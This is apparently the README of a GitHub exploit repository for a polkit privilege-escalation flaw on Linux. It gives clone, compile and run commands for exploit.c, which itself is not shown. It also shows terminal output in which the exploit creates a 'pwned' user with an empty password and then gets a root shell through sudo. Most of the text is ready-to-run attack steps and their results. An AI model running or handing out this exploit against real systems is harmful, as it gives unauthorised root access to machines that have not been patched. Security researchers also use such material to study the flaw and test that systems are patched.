# polkit-vuln
Exploiting boundaries

## Steps to run

Clone Repo
```
git clone https://github.com/umegbewe/polkit-vuln
```

Compile the exploit
```Shell
gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1)
```

Run the exploit
```Shell
./exploit
```

Output
```Shell
┌──kali㉿kali)-[~]
└─$ ./exploit
[*] creating "pwned-1631954041" user ...
[!] user has been created!
[*] user: pwned-1631954041, uid: 1006
[*] setting an empty password for "pwned-1631954041" user..
[*] an empty password has been set for "pwned-1631954041" user!
[!] run: "sudo su root" as "pwned-1631954041" user to get root
┌──(pwned-1631954041㉿kali)-[/home/kali]
└─$ sudo su root

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

┌──(root💀kali)-[/home/kali]
└─# 

```



